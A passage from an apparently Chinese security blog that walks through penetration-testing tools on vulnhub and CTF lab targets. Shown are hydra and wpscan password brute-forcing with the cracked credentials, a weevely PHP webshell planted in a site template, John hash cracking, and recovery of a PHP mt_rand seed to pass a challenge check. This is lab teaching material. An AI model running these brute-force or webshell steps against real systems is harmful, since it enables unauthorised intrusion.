class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">-l, <span class="comment">--list &lt;type&gt; </span></span><br><span class="line"><span class="comment"># 列出所有可用的项目，其中值可以被设置为 payloads, encoders, nops, platforms, archs, encrypt, formats等等</span></span><br><span class="line">-p, <span class="comment">--payload &lt;payload&gt; </span></span><br><span class="line"><span class="comment"># 指定特定的 Payload，如果被设置为 - ，那么从标准输入流中读取</span></span><br><span class="line"><span class="comment">--list-options </span></span><br><span class="line"><span class="comment"># 列出--payload &lt;value&gt; 的标准，高级和规避选项</span></span><br><span class="line">-f, <span class="comment">--format &lt;format&gt; </span></span><br><span class="line"><span class="comment"># 指定 Payload 的输出格式(使用 --list formats 列出)</span></span><br><span class="line">-e, <span class="comment">--encoder &lt;encoder&gt; </span></span><br><span class="line"><span class="comment"># 指定使用的 Encoder (使用 --list encoders 列出)</span></span><br><span class="line"><span class="comment">--sec-name &lt;value&gt; </span></span><br><span class="line"><span class="comment"># 生成大型Windows二进制文件时使用的新名称。默认值：随机4个字符的字符串</span></span><br><span class="line"><span class="comment">--smallest </span></span><br><span class="line"><span class="comment"># 使用所有可用的编码器生成最小的payload</span></span><br><span class="line"><span class="comment">--encrypt &lt;value&gt; </span></span><br><span class="line"><span class="comment"># 应用于shellcode的加密或编码类型 (使用--list encrypt 列出)</span></span><br><span class="line"><span class="comment">--encrypt-key &lt;value&gt; </span></span><br><span class="line"><span class="comment"># 用于加密的密钥</span></span><br><span class="line"><span class="comment">--encrypt-iv &lt;value&gt; </span></span><br><span class="line"><span class="comment"># 加密的初始化向量</span></span><br><span class="line">-<span class="keyword">a</span>, <span class="comment">--arch &lt;arch&gt; </span></span><br><span class="line"><span class="comment"># 指定目标系统架构(使用 --list archs 列出)</span></span><br><span class="line"><span class="comment">--platform &lt;platform&gt; </span></span><br><span class="line"><span class="comment"># 指定目标系统平台 (使用 --list platforms 列出)</span></span><br><span class="line">-o, <span class="comment">--out &lt;path&gt; </span></span><br><span class="line"><span class="comment"># 保存payload文件</span></span><br><span class="line">-b, <span class="comment">--bad-chars &lt;list&gt; </span></span><br><span class="line"><span class="comment"># 设置需要在 Payload 中避免出现的字符，如： &#x27;\x00\xff&#x27;</span></span><br><span class="line">-n, <span class="comment">--nopsled &lt;length&gt; </span></span><br><span class="line"><span class="comment"># 指定 nop 在 payload 中的数量</span></span><br><span class="line">-s, <span class="comment">--space &lt;length&gt; </span></span><br><span class="line"><span class="comment"># 设置未经编码的 Payload 的最大长度</span></span><br><span class="line"><span class="comment">--encoder-space &lt;length&gt; </span></span><br><span class="line"><span class="comment"># 编码后的 Payload 的最大长度</span></span><br><span class="line">-i, <span class="comment">--iterations &lt;count&gt; </span></span><br><span class="line"><span class="comment"># 设置 Payload 的编码次数</span></span><br><span class="line">-c, <span class="comment">--add-code &lt;path&gt; </span></span><br><span class="line"><span class="comment"># 指定包含一个额外的win32 shellcode文件</span></span><br><span class="line">-x, <span class="comment">--template &lt;path&gt; </span></span><br><span class="line"><span class="comment"># 指定一个特定的可执行文件作为模板</span></span><br><span class="line">-k, <span class="comment">--keep </span></span><br><span class="line"><span class="comment"># 保护模板程序的功能，注入的payload作为一个新的进程运行</span></span><br><span class="line">-v, <span class="comment">--var-name &lt;value&gt; </span></span><br><span class="line"><span class="comment"># 指定一个变量名（当添加 -f 参数的时候，例如 -f python，那么输出为 python 代码， payload 会被按行格式化为 python 代码，追加到一个 python 变量中，这个参数即为指定 python 变量的变量名）</span></span><br><span class="line">-t, <span class="comment">--timeout &lt;second&gt; </span></span><br><span class="line"><span class="comment"># 设置从STDIN读取payload的等待时间（默认为30,0为禁用）</span></span><br><span class="line">-h, <span class="comment">--help </span></span><br><span class="line"><span class="comment"># 帮助</span></span><br></pre></td></tr></table></figure>



<h2 id="2）hydra"><a href="#2）hydra" class="headerlink" title="2）hydra"></a>2）hydra</h2><blockquote>
<p><code>hydra是一个自动化的爆破工具,暴力破解弱密码,是一个支持众多协议的爆破工具</code></p>
</blockquote>
<h3 id="1-爆破用户密码"><a href="#1-爆破用户密码" class="headerlink" title="1.爆破用户密码"></a>1.爆破用户密码</h3><p><strong>这里以vulnhub dc1为例</strong></p>
<p>用了<code>hydra</code>[海德拉]工具，对<code>flag4</code>用户进行爆破</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">hydra -l flag4 -<span class="selector-tag">p</span> /usr/share/wordlists/rockyou<span class="selector-class">.txt</span><span class="selector-class">.gz</span> <span class="number">192.168</span>.<span class="number">133.136</span> -vV -f</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-l是指定用户或指定包含多个用户的文件，-<span class="selector-tag">p</span>是指定密码或指定包含多个密码的文件，ssh就是</span><br><span class="line">用户所在的网站</span><br><span class="line"></span><br><span class="line">上面-<span class="selector-tag">p</span>的文件是kali自带的密码包，当然也可以用其他的</span><br><span class="line"></span><br><span class="line">-s 端口</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/tooluse(Commontools)/image-20220830211739164.png"><img src="/tooluse(Commontools)/image-20220830211739164.png" alt="image-20220830211739164"></a></p>
<p>这里就看到<code>flag4</code>用户的密码被爆破出来，是<code>orange</code></p>
<p>然后用<code>ssh</code>连接</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入ssh <span class="symbol">flag4@</span><span class="number">192.168</span><span class="number">.133</span><span class="number">.136</span></span><br><span class="line">然后yes</span><br><span class="line">然后输入密码：orange</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/tooluse(Commontools)/image-20220830211817515.png"><img src="/tooluse(Commontools)/image-20220830211817515.png" alt="image-20220830211817515"></a></p>
<h2 id="3）cewl"><a href="#3）cewl" class="headerlink" title="3）cewl"></a>3）cewl</h2><blockquote>
<p> <code>Cewl是一个通过指定url及深度,使用爬虫技术,生成字典的一个工具。Cewl是通过ruby编写,通过爬取网站并提取独立的单词保存为字典,可以和John the Ripper等工具配合使用。</code></p>
<p> <code>主要还是根据网站自身的关键词，然后生成的字典，比如cewl，flag等等</code></p>
</blockquote>
<p><strong>这里以vulnhub dc2为例</strong></p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-w等同于&gt;   <span class="comment">//写入</span></span><br><span class="line">-m n       <span class="comment">//至少生成的长度为n，默认是3</span></span><br><span class="line">-d x       <span class="comment">//生成更大的字典，默认x=2</span></span><br></pre></td></tr></table></figure>



<p>我们用<code>cewl</code>试试生成字典</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入cewl http:<span class="comment">//dc-2/ &gt;pass.txt</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/tooluse(Commontools)/image-20220831221031390.png"><img src="/tooluse(Commontools)/image-20220831221031390.png" alt="image-20220831221031390"></a></p>
<p>目录下就会生成<code>pass.txt</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入<span class="built_in">cat</span> pass.txt，查看内容</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/tooluse(Commontools)/image-20220831221151099.png"><img src="/tooluse(Commontools)/image-20220831221151099.png" alt="image-20220831221151099"></a></p>
<p>发现是生成对应网站的密码字典</p>
<h2 id="4）wpscan"><a href="#4）wpscan" class="headerlink" title="4）wpscan"></a>4）wpscan</h2><blockquote>
<p><code>WPScan是Kali Linux默认自带的一款漏洞扫描工具,它采用Ruby编写 能够扫描WordPress网站中的多种安全漏洞,其中包括主题漏洞、插件漏洞和WordPress本身的漏洞</code></p>
</blockquote>
<p><strong>这里以vulnhub dc2为例</strong></p>
<figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wpscan -<span class="built_in">url</span> <span class="attribute">http</span>:<span class="comment">//dc-2 -e u</span></span><br><span class="line"></span><br><span class="line">-e u    <span class="comment">//枚举用户信息</span></span><br><span class="line"></span><br><span class="line">wpscan -<span class="built_in">url</span> xx -P xx -U xx</span><br><span class="line">-P passwdspath  <span class="comment">//密码字典路径，或者直接写</span></span><br><span class="line">-U userspath    <span class="comment">//用户名字典路径，或者直接写</span></span><br></pre></td></tr></table></figure>



<p>于是我们就可以针对性对wordpress进行渗透看看，可不可以利用一下</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入wpscan <span class="params">--url</span> http:<span class="string">//dc-2</span> -e u</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/tooluse(Commontools)/image-20220831223359965.png"><img src="/tooluse(Commontools)/image-20220831223359965.png" alt="image-20220831223359965"></a></p>
<p>然后往下看用户名</p>
<p><a data-fancybox="gallery" data-src="/tooluse(Commontools)/image-20220831223432802.png"><img src="/tooluse(Commontools)/image-20220831223432802.png" alt="image-20220831223432802"></a></p>
<p>发现有三个，然后可以复制下来，弄一个用户名的文本，和之前的<code>pass.txt</code>这个密码本一样</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入vi un.txt,把admin <span class="keyword">jerry </span>tom复制进去</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/tooluse(Commontools)/image-20220831223714569.png"><img src="/tooluse(Commontools)/image-20220831223714569.png" alt="image-20220831223714569"></a></p>
<p>然后就可以结合我们的密码文本和用户名文本，利用wpscan这个工具，进行爆破操作了</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入wpscan <span class="params">--url</span> http:<span class="string">//dc-2</span> -P pass.txt -U un.txt</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/tooluse(Commontools)/image-20220831223950721.png"><img src="/tooluse(Commontools)/image-20220831223950721.png" alt="image-20220831223950721"></a></p>
<p>稍微等一会</p>
<p><a data-fancybox="gallery" data-src="/tooluse(Commontools)/image-20220831224205560.png"><img src="/tooluse(Commontools)/image-20220831224205560.png" alt="image-20220831224205560"></a></p>
<p>admin用户密码没有找到，应该是最高权限的账号</p>
<p>但是jerry和tom用户的密码知道了</p>
<h2 id="5）John"><a href="#5）John" class="headerlink" title="5）John"></a>5）John</h2><p>John是一个破解系统密码的工具</p>
<p>使用很简单</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">john passwd<span class="selector-class">.txt</span> <span class="comment">//这里是直接利用john自带的密码本，后面接的是需要爆破的密码文本文件</span></span><br><span class="line"></span><br><span class="line">john <span class="attr">--wordlist</span>=字典路径 passwd<span class="selector-class">.txt</span> <span class="comment">//这里是指定密码本，后面接的是需要爆破的密码文本文件</span></span><br></pre></td></tr></table></figure>



<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john <span class="attr">--show</span> passwd<span class="selector-class">.txt</span> <span class="comment">//这是查看该密码文本中已经被爆破成功过的密码</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/tooluse(Commontools)/image-20220903140126704.png"><img src="/tooluse(Commontools)/image-20220903140126704.png" alt="image-20220903140126704"></a></p>
<p>就可以看到明文为<code>snoopy</code></p>
<h2 id="6）weevely"><a href="#6）weevely" class="headerlink" title="6）weevely"></a>6）weevely</h2><blockquote>
<p>Weevely是一款使用python编写的webshell工具,集webshell生成和连接于一身,采用c&#x2F;s模式 构建,可以算作是linux下的一款php菜刀替代工具</p>
</blockquote>
<p>生成Shell</p>
<figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">weevely <span class="keyword">generate</span>  &lt;文件名&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">weevely <span class="keyword">generate</span> <span class="number">123456</span> shell<span class="variable">.php</span></span><br></pre></td></tr></table></figure>

<p>把生成的内容，复制到我们创建的<code>789.php</code>文件里，和前面两个方法步骤一样</p>
<p>利用触发shell</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">weevely</span> http://<span class="number">192.168.133.139</span>/templates/protostar/<span class="number">789</span>.php <span class="number">123456</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">python</span> -m http.server <span class="number">9999</span>   </span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/tooluse(Commontools)/image-20220904133118746.png"><img src="/tooluse(Commontools)/image-20220904133118746.png" alt="image-20220904133118746"></a></p>
<p>成功进入shell</p>
<h2 id="7）whatweb"><a href="#7）whatweb" class="headerlink" title="7）whatweb"></a>7）whatweb</h2><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whatweb http:<span class="comment">//192.168.220.156/ &gt;&gt; whatweb.txt</span></span><br><span class="line"><span class="comment">//把网站的框架信息导入到文本whatweb.txt中</span></span><br></pre></td></tr></table></figure>

<p>这个工具主要是查看网站的框架，和<code>wapplzer</code>类似</p>
<p><a data-fancybox="gallery" data-src="/tooluse(Commontools)/image-20221103104233193.png"><img src="/tooluse(Commontools)/image-20221103104233193.png" alt="image-20221103104233193"></a></p>
<h2 id="8）knockd"><a href="#8）knockd" class="headerlink" title="8）knockd"></a>8）knockd</h2><blockquote>
<p>在1920年代，当禁令如火如荼地进行时，如果您想进入说话状态，就必须知道秘密的敲门声，并正确地敲打它才能进入内部。</p>
<p>端口敲门是现代的等同物。 如果您希望人们可以访问您计算机上的服务，但又不想将防火墙打开到Internet，则可以使用端口断开功能。<br>它允许您关闭防火墙上允许传入连接的端口，并在进行预先安排的连接尝试方式时自动打开它们。 连接尝试的顺序充当秘密敲门。 另一个秘密的敲门声关闭了港口。</p>
</blockquote>
<p>什么意思呢，也就是说，我先关闭了一个端口</p>
<p>但是呢，我为了我想要的人访问它，我写了一个<code>敲门的顺序（也就是访问端口的顺序）</code></p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">顺序在<span class="regexp">/etc/</span>knockd.conf</span><br></pre></td></tr></table></figure>

<p>比如，</p>
<p>我关闭了</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">22/ssh端口</span><br></pre></td></tr></table></figure>

<p>我写了一个顺序</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">7893</span>,<span class="number">6452</span>,<span class="number">2412</span></span><br></pre></td></tr></table></figure>

<p>这是三个端口</p>
<p>我为什么为你<code>打开22端口</code>，原因是因为你<code>敲对了顺序</code></p>
<p>这里就涉及<code>敲门的方法</code></p>
<h3 id="1-knock命令"><a href="#1-knock命令" class="headerlink" title="1&gt; knock命令"></a>1&gt; knock命令</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">knock</span> <span class="number">192.168.1.8</span> <span class="number">7469</span> <span class="number">8475</span> <span class="number">9842</span> //<span class="number">192.168.1.8</span>为目标ip</span><br></pre></td></tr></table></figure>

<h3 id="2-nc命令"><a href="#2-nc命令" class="headerlink" title="2&gt;nc命令"></a>2&gt;nc命令</h3><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ nc -v dc9 <span class="number">7469</span></span><br><span class="line"><span class="number">10.0.0.14</span>: inverse host lookup failed: Unknown host</span><br><span class="line">(UNKNOWN) <span class="string">[10.0.0.14]</span> <span class="number">7469</span> (?) : Connection refused</span><br><span class="line"></span><br><span class="line">$ nc -v dc9 <span class="number">8475</span>                                                                                       </span><br><span class="line"><span class="number">10.0.0.14</span>: inverse host lookup failed: Unknown host</span><br><span class="line">(UNKNOWN) <span class="string">[10.0.0.14]</span> <span class="number">8475</span> (?) : Connection refused</span><br><span class="line"></span><br><span class="line">$ nc -v dc9 <span class="number">9842</span>                                                                                       </span><br><span class="line"><span class="number">10.0.0.14</span>: inverse host lookup failed: Unknown host</span><br><span class="line">(UNKNOWN) <span class="string">[10.0.0.14]</span> <span class="number">9842</span> (?) : Connection refused</span><br><span class="line"></span><br><span class="line">也就是利用nc命令三次访问这<span class="number">3</span>个端口</span><br></pre></td></tr></table></figure>

<p>最后用<code>nmap</code>扫一下就看见<code>22</code>端口打开了</p>
<h2 id="9-openssl"><a href="#9-openssl" class="headerlink" title="9)openssl"></a>9)openssl</h2><h3 id="SSL-简介"><a href="#SSL-简介" class="headerlink" title="SSL 简介"></a>SSL 简介</h3><blockquote>
<p>按照我的理解来解释下，</p>
<p>为了让网络通信更安全，需要认证和加密，认证是说明你是要找的人，加密是为了让截获中间报文第三者无法得到消息内容。</p>
<p>为此有人设计了SSL，即套接字上的安全层，简单来说就是在TCP之上做一个安全通信层，HTTP on SSL 即是HTTPs，</p>
<p>现在几乎所有的银行网站访问都是基于HTTPS协议的。<br>认证是通过证书+非对称加密算法来解决的</p>
</blockquote>
<blockquote>
<p>openssl可以实现：秘钥证书管理、对称加密和非对称加密。</p>
</blockquote>
<p>举一个例子</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -<span class="number">1</span> -salt salt password</span><br><span class="line">==&gt;</span><br><span class="line"><span class="variable">$1</span><span class="variable">$salt</span><span class="variable">$qJH7</span>.N4xYta3aEG<span class="regexp">/dfqo/</span><span class="number">0</span></span><br><span class="line"></span><br><span class="line">-<span class="number">1</span>使用什么哈希算法。在我们的用例中，这无关紧要，因此我们使用 MD5，在现实世界的 PT 中应该避免使用 MD5，因为它不安全。</span><br><span class="line"></span><br><span class="line">-salt salt用作盐的字符串。我选择字符串盐</span><br><span class="line"></span><br><span class="line">password我们想使用的明文密码</span><br></pre></td></tr></table></figure>

<h2 id="10-gobuster"><a href="#10-gobuster" class="headerlink" title="10)gobuster"></a>10)gobuster</h2><h3 id="爆破目录"><a href="#爆破目录" class="headerlink" title="爆破目录"></a>爆破目录</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">gobuster</span> dir -w <span class="meta">common</span>.txt -u url</span><br></pre></td></tr></table></figure>

<h3 id="爆破子域名"><a href="#爆破子域名" class="headerlink" title="爆破子域名"></a>爆破子域名</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">gobuster</span> vhost -w subdomains-top1million-<span class="number">5000</span>.txt -u url</span><br></pre></td></tr></table></figure>

<h2 id="11-seed工具php-mt-seed"><a href="#11-seed工具php-mt-seed" class="headerlink" title="11)seed工具php_mt_seed"></a>11)seed工具php_mt_seed</h2><p>这里以一道题为例子讲解这个工具的使用</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;seed.php&quot;</span>);</span><br><span class="line"><span class="comment">//mt_srand(*********);</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Hint: &quot;</span>.<span class="title function_ invoke__">mt_rand</span>().<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>()))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/base|\.\./i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/NewStar/i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">        <span class="comment">//flag in `flag.php`</span></span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Baby Hacker?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;No Hacker!&quot;</span>;</span><br><span class="line">&#125; Hint: <span class="number">1219893521</span></span><br><span class="line">No Hacker!</span><br></pre></td></tr></table></figure>

<hr>
<p>搜索这两个函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">mt_scrand</span>()</span><br><span class="line"><span class="title function_ invoke__">mt_rand</span>()  </span><br></pre></td></tr></table></figure>

<p><code>mt_scrand(seed)</code>这个函数的意思，是通过分发<code>seed</code>种子，然后种子有了后，靠<code>mt_rand()</code>生成随机数。</p>
<p>我们来写段代码。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">12345</span>);    </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>().<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>

<p>我们访问，输出<code>162946439</code>。</p>
<p>现在代码改为</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">12345</span>);    </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>().<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>().<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>().<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>().<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>().<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span>    </span><br></pre></td></tr></table></figure>

<p>我们再次访问:</p>
<blockquote>
<p>162946439</p>
<p>247161732</p>
<p>1463094264</p>
<p>1878061366</p>
<p>394962642</p>
</blockquote>
<p>发现<code>162946439</code>又出现了</p>
<blockquote>
<p>所以可以推断出随机数其实是可预测的，</p>
<p>它以一种线性的方式生成</p>
<p>知道种子和一组伪随机数不是就可以推y(伪随机数了吗),当然实际上更复杂肯定。</p>
<p>我知道种子后，可以确定你输出伪随机数的序列。<br>知道你的随机数序列，可以确定你的种子。 </p>
</blockquote>
<p>在我们的例题中，我们并不知道我们的种子是多少</p>
<p>但是它给出了我们种子的第一个随机数<code>1219893521</code></p>
<p>这个时候想要拿到种子的值，就需要大量反向的演算推导了</p>
<p>这个过程很庞大，所以这里就用到了工具【脚本】<code>php_mt_seed</code></p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">time</span> ./php_mt_seed 第一个随机数  </span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/tooluse(Commontools)/image-20221120141340099.png"><img src="/tooluse(Commontools)/image-20221120141340099.png" alt="image-20221120141340099"></a></p>
<p>于是我们就得到了我们的<code>seed</code></p>
<blockquote>
<p>1145146</p>
</blockquote>
<p>再分析源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Hint: &quot;</span>.<span class="title function_ invoke__">mt_rand</span>().<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>()))&#123;</span><br></pre></td></tr></table></figure>

<p>这里在 echo处已经随机了一次，所以在底下比较的时候就算第二个随机数进行强类型比较</p>
<p>于是</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="string">&quot;1145146&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line"></span><br><span class="line">==&gt;<span class="number">1219893521</span>&lt;br&gt;<span class="number">1202031004</span></span><br></pre></td></tr></table></figure>

<p>得到<code>guess</code>参数的值<code>1202031004</code></p>
<p>对于最后对<code>file</code>文件包含语句的正则匹配绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/base|\.\./i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/NewStar/i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))</span><br></pre></td></tr></table></figure>

<p>大概就是不能出现<code>base</code>，然后参数中间要包含<code>/NewStar/</code>这一段</p>
<figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="keyword">file</span>=php:<span class="comment">//filter</span></span><br></pre></td></tr></table></figure>

<h2 id="12-nmap"><a href="#12-nmap" class="headerlink" title="12)nmap"></a>12)nmap</h2><p><strong>Nmap输出格式</strong></p>
<ul>
<li>-oN (标准输出)</li>
